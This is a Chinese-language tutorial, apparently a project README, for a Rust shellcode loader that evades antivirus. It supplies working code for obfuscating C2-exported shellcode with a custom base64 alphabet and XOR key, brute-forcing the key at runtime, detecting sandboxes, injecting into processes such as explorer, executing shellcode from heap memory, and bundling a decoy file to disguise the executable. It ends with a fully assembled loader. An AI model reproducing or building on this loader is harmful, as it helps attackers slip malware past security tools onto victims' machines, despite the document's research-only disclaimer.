# 0x00 注：本项目为柴薪工作室原创，仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布者不承担任何法律及连带责任。
## 效果图
![](https://mmbiz.qpic.cn/sz_mmbiz_png/sLeE46eddMGhjmIyGibxHhk4XMiahTPTItcmwH618ySudocxte4DAwgTxGEcVaiaGjgP5OfxAzcJpHEEWxJ9HCiaag/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
## 公众号
![](https://mp.weixin.qq.com/mp/qrcode?scene=10000004&size=102&__biz=MzkzMDMxNDgzNA==&mid=100000003&idx=1&sn=5c4a0d978b63135a390d45cca30de153&send_time=1713752938)

# 0x01 实验环境准备
1. Windows 环境
2. 安装 rust 编辑器 https://www.jetbrains.com/rust/nextversion/

![](https://cdn.nlark.com/yuque/0/2024/png/29308756/1713751700290-5e4936ee-a0ea-4a26-9305-f4f13779260e.png#averageHue=%23e79448&clientId=ufde2ddcf-2b5b-4&from=paste&id=u3195fa91&originHeight=716&originWidth=1354&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u003db3cb-fdcb-4993-8c8c-b2025a65133&title=)

1. 安装之后，打开编辑器，在新建项目中安装 rust 环境

![](https://cdn.nlark.com/yuque/0/2024/png/29308756/1713751700246-85c61d2c-def0-4c44-989c-57aa2d161eef.png#averageHue=%23292c30&clientId=ufde2ddcf-2b5b-4&from=paste&id=u4b4ad5e1&originHeight=1310&originWidth=1540&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u528fc13e-43ad-42b8-a93a-9845e75db01&title=)
# 0x02 免杀思路
暂时无法在飞书文档外展示此内容
# 0x03 加密与解密代码编写
由于这个项目已经是公开于众的，所以不能让shellcode 存在特征，所以我们将使用base64加密(改)+伪随机数爆破的方式来更改特征
## 引入shellcode

1. 在cs或其他 c2工具 导出 .bin 文件 (SHELLCODE)

Ps: 放出执行 calc.exe 的shellcode
暂时无法在飞书文档外展示此内容
## 加密代码
调用base64_dynamic_encode 函数之后会输出 shellcode 和 "bingo" 加密后的类base64的密码密文。
```rust
// 混淆base64 顺序，必须64个不同的字符串
const ALPHABET: &str = "/wVO(Mb&%x,UC<#:Zj}zliyK-!_$vH*DFIe{dm^AXng>?.N;SB~|TEaQ+c)r@520";

pub fn base64_encode_with_random(input: &[u8], key: u64) -> String {
    let alphabet =
        alphabet::Alphabet::new(ALPHABET).unwrap();
    let crazy_config = engine::GeneralPurposeConfig::new()
        .with_decode_allow_trailing_bits(true)
        .with_encode_padding(true)
        .with_decode_padding_mode(engine::DecodePaddingMode::RequireNone);

    let crazy_engine = engine::GeneralPurpose::new(&alphabet, crazy_config);


    let mut rng = StdRng::seed_from_u64(key);
    let random_value: u8 = rng.gen();

    let mut data = input.to_vec();
    for byte in &mut data {
        *byte ^= random_value;
    }

    crazy_engine.encode(&data)
}


pub fn base64_dynamic_encode(shellcode:&[u8], dynamic_key:u64){

    let encoded = crypt::base64::base64_encode_with_random(shellcode, dynamic_key);
    let check_decode = crypt::base64::base64_encode_with_random("bingo".as_bytes(), dynamic_key);

    println!("let base_shellcode = {:?};", encoded);
    println!("let check = \"{}\";", check_decode);
}

fn main() {
    let key = 7122;
    // 加密shellcode
    let shellcode: &[u8] = include_bytes!("../static/calc.bin");
    base64_dynamic_encode(shellcode,key);
}
```
运行后输出的结果
```rust
let base_shellcode = ">I>j.g,)dmx}lICO(S%//SZ_-+/Qb.d/CI>!/(X_aZw~b.dF/InHcjF-&a#$b^#}0^+|Umw2vI#z^E@zlc#S;S/z/B>!/&U!(b+_l+U!T.n}lm%_Ec%^<jnzFFU!bdXyajx~bE#V?ZZ_>!?zay$_bm#(&a#$b^#}0I#z^E@zlc<g?e*{&m(*HmXK_+CAeFXyajxabE#V<w:!KIXyajx#bE#V(5myaInzFIC,(SXCVSFzVICU(SF_T$c~(SV.?FXzVSF_alVrw_a.>Z@_)M<}lmx}lmx}b.0DlE<}lI:X-5d5E_a&)_UA@/Zz):z&r@2.IB>jmAnNiVc-Tg^~xEDnMl(F:zI}VB:$e,a&CzC2CKSQ,{H}";
let check = "CO?@<zT=";
```
## 解密代码
在加密代码之后，获取了结果后，将结果的两个变量复制到调用解密的函数中 (main),执行之后，经过一段时间将会还原为原始的shellcode
```rust
// 混淆base64 顺序，必须64个不同的字符串
const ALPHABET: &str = "/wVO(Mb&%x,UC<#:Zj}zliyK-!_$vH*DFIe{dm^AXng>?.N;SB~|TEaQ+c)r@520";

pub fn base64_decode_with_random(input: &str, key: u64) -> Result<Vec<u8>, base64::DecodeError> {
    let mut rng = StdRng::seed_from_u64(key);
    let random_value: u8 = rng.gen();
    let alphabet =
        alphabet::Alphabet::new(ALPHABET).unwrap();
    let crazy_config = engine::GeneralPurposeConfig::new()
        .with_decode_allow_trailing_bits(true)
        .with_encode_padding(true)
        .with_decode_padding_mode(engine::DecodePaddingMode::RequireNone);

    let crazy_engine = engine::GeneralPurpose::new(&alphabet, crazy_config);
    let mut data =     crazy_engine.decode(input)?;

    for byte in &mut data {
        *byte ^= random_value;
    }

    Ok(data)
}

pub fn base64_dynamic_decode(check_decode:&str, dynamic_key:u64) -> u64 {
    loop {
        let start_time = Instant::now();
        sleep(Duration::from_millis(100));
        let elapsed_time = start_time.elapsed();
        let ran_time: u64 = rand::thread_rng().gen_range(1..25);
        let ran_xor: u64 = rand::thread_rng().gen_range(1..10);
        let key: u64 = dynamic_key - (elapsed_time.as_millis() as u64 - (ran_time ^ ran_xor));
        println!("{key}");
        match crypt::base64::base64_decode_with_random(check_decode, key) {
            Ok(t) => {
                match String::from_utf8(t) {
                    Ok(t) => unsafe {
                        if t == "bingo" {
                            return key
                        }
                    },
                    Err(_e) => (),
                }
            }
            Err(_e) => {}
        };
    }
}

fn main() {
    let key = 7122+90;
    // //  解密执行 shellcode
    let base_shellcode = ">I>j.g,)dmx}lICO(S%//SZ_-+/Qb.d/CI>!/(X_aZw~b.dF/InHcjF-&a#$b^#}0^+|Umw2vI#z^E@zlc#S;S/z/B>!/&U!(b+_l+U!T.n}lm%_Ec%^<jnzFFU!bdXyajx~bE#V?ZZ_>!?zay$_bm#(&a#$b^#}0I#z^E@zlc<g?e*{&m(*HmXK_+CAeFXyajxabE#V<w:!KIXyajx#bE#V(5myaInzFIC,(SXCVSFzVICU(SF_T$c~(SV.?FXzVSF_alVrw_a.>Z@_)M<}lmx}lmx}b.0DlE<}lI:X-5d5E_a&)_UA@/Zz):z&r@2.IB>jmAnNiVc-Tg^~xEDnMl(F:zI}VB:$e,a&CzC2CKSQ,{H}";
    let check = "CO?@<zT";
    let base_key = crypt::dynamic::base64_dynamic_decode(check,key);
    let shellcode = crypt::base64::base64_decode_with_random(base_shellcode,base_key).unwrap();
}
```
# 0x04 沙箱检测
按需引用，个人一般 检测进程数量和硬盘大小 即可。
## 进程数量
Todo
## 核心数量
检测cpu 核心数量，一般小于或等于 2 核 的为 蜜罐
```rust
pub unsafe fn check_processor_count() -> bool {
    let mut system_info: SYSTEM_INFO = std::mem::zeroed();
    GetSystemInfo(&mut system_info);
    system_info.dwNumberOfProcessors > 2
}
```
## 内存大小
Todo
## 硬盘大小
Todo
## 系统分页数量

1.   检测 系统分页文件总页数 ， 一般小于4_000_000 可能为蜜罐
```rust
pub fn get_num_pages() -> i32 {
    let mut statex: MEMORYSTATUSEX = unsafe { std::mem::zeroed() };
    statex.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
    if unsafe { GlobalMemoryStatusEx(&mut statex) } == 0 {
        // eprintln!("Failed to get system memory status.");
        return 1;
    }
    let mut system_info: SYSTEM_INFO = unsafe { std::mem::zeroed() };
    unsafe { GetSystemInfo(&mut system_info) };
    return (statex.ullTotalPageFile / system_info.dwPageSize as u64) as i32;
}
```
## 判断是否存在进程
Todo
## 当前文件名是否更改
Todo
## 时间流速
```rust
pub fn flow_time() -> bool {
    let start_time = Instant::now();

    sleep(Duration::from_millis(100));

    let elapsed_time = start_time.elapsed();

    if elapsed_time.as_millis() < 100 {
        return true;
    }
    false
}
```
# 0x05 shellcode 执行
### 进程注入
```rust
/* 注入到进程 ， pid 为进程名
    // 根据程序名获取进程pid
    let s = System::new_all();
    let process_id: u32 = s
                                .processes_by_name("explorer")
                                .next()
                                .unwrap()
                                .pid()
                                .as_u32();
*/
pub unsafe fn inject_code(pid: u32, code: &[u8]) -> Result<(), Error> {
    let process: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if process.is_null() {
        return Err(Error::last_os_error());
    }

    let remote_memory = VirtualAllocEx(
        process,
        null_mut(),
        code.len(),
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
    );
    if remote_memory.is_null() {
        return Err(Error::last_os_error());
    }

    let mut bytes_written = 0;
    if WriteProcessMemory(
        process,
        remote_memory,
        code.as_ptr() as *const _,
        code.len(),
        &mut bytes_written,
    ) == 0
    {
        return Err(Error::last_os_error());
    }

    let thread = CreateRemoteThread(
        process,
        null_mut(),
        0,
        Some(std::mem::transmute(remote_memory)),
        null_mut(),
        0,
        null_mut(),
    );
    if thread.is_null() {
        return Err(Error::last_os_error());
    }

    Ok(())
}
```
### 直接加载
 加载shellcode 到内存中执行，杀软一般不会检测
```rust
pub unsafe  fn exec(code: &[u8]){
    let heap = HeapCreate(0x40000, 0, 0);
    let ptr = HeapAlloc(heap, 8, code.len());
    if GetLastError() == 0 {
        std::ptr::copy(
            code.as_ptr() as *const u8,
            ptr as *mut u8,
            code.len(),
        );
        let exec_function = transmute::<*mut c_void, fn()>(ptr);
        exec_function();
    }
}
```
### DLL 加载
  动态加载dll，加载 HeapCreate 和 HeapAlloc 函数, 实现shellcode 执行。360会检测dll加载函数
```rust
pub unsafe fn dll_exec(code: &[u8]) {
    let lib = Library::new("Kernel32.dll").unwrap();
    // 获取HeapCreate函数
    let heap_create: Symbol<unsafe extern "system" fn(DWORD, usize, usize) -> HeapHandle> = lib.get(b"HeapCreate").unwrap();
    // 获取HeapAlloc函数
    let heap_alloc: Symbol<unsafe extern "system" fn(HeapHandle, HEAP_FLAGS, usize) ->  *mut std::ffi::c_void> = lib.get(b"HeapAlloc").unwrap();
    // 创建 堆空间
    let heap = heap_create(0x40000, 0, 0);
    let heap_alloc: Symbol<unsafe extern "system" fn(HeapHandle, HEAP_FLAGS, usize) ->  *mut std::ffi::c_void> = lib.get(b"HeapAlloc").unwrap();
    let ptr = heap_alloc(heap, 8, code.len());
    if GetLastError() == 0 {
        ptr::copy(
            code.as_ptr() as *const u8,
            ptr as *mut u8,
            code.len(),
        );
        let exec_function = transmute::<*mut std::os::raw::c_void, fn()>(ptr);
        exec_function();
    }
}
```
# 0x06 文件伪装
### WIN文件名特性
### 取消黑框
在 main方法所在 .rs 文件中添加
#![windows_subsystem = "windows"]
### 程序图标
https://rustcc.cn/article?id=54fa5566-2cca-4835-97c4-a241d4d693b7
### 捆绑文件
需要更改第6行 和 第 11行
```rust
use std::io::Write;
use std::os::windows::process::CommandExt;
use tempfile::NamedTempFile;
use winapi::um::winbase::CREATE_NO_WINDOW;

pub fn memory2temp_file_start() {
    // 由于， include_bytes 函数不支持写变量，所以需要自助修改，
    const MEMORY_FILE:&[u8] = include_bytes!("../../static/111.txt");
    // 创建一个临时文件，将内存文件写到临时文件里
    let mut temp_file = NamedTempFile::new().unwrap();
    temp_file.write_all(MEMORY_FILE).unwrap();
    // 还要改后缀名
    let file_path = temp_file.path().with_extension("txt");

    // 获取临时文件的路径
    std::fs::rename(&temp_file.path(), &file_path).expect("TODO: panic message");


    use std::process::Command;
    // 利用cmd 打开文件
    Command::new("cmd")
        .args(&["/c", "start", "/B", file_path.to_str().unwrap()])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .expect("Failed to open PDF file");
}
```
# 0X07 示例

1. 加密shellcode
```rust
let key = 7122;
let shellcode: &[u8] = include_bytes!("../static/calc.bin");
crypt::dynamic::base64_dynamic_encode(shellcode,key);
```

2. SHELLCODE 执行
```rust
#![windows_subsystem = "windows"]
mod forgery;
mod sandbox;
mod crypt;
mod  shellcode;

fn main() {
    let key = 7122 + 90;
    forgery::bundle::memory2temp_file_start();
    //  解密执行 shellcode
    let base_shellcode = ">I>j.g,)dmx}lICO(S%//SZ_-+/Qb.d/CI>!/(X_aZw~b.dF/InHcjF-&a#$b^#}0^+|Umw2vI#z^E@zlc#S;S/z/B>!/&U!(b+_l+U!T.n}lm%_Ec%^<jnzFFU!bdXyajx~bE#V?ZZ_>!?zay$_bm#(&a#$b^#}0I#z^E@zlc<g?e*{&m(*HmXK_+CAeFXyajxabE#V<w:!KIXyajx#bE#V(5myaInzFIC,(SXCVSFzVICU(SF_T$c~(SV.?FXzVSF_alVrw_a.>Z@_)M<}lmx}lmx}b.0DlE<}lI:X-5d5E_a&)_UA@/Zz):z&r@2.IB>jmAnNiVc-Tg^~xEDnMl(F:zI}VB:$e,a&CzC2CKSQ,{H}";
    let check = "CO?@<zT";
    let base_key = crypt::dynamic::base64_dynamic_decode(check,key);
    let shellcode = crypt::base64::base64_decode_with_random(base_shellcode,base_key).unwrap();
    unsafe { shellcode::exec(shellcode.as_slice()) }
}
```
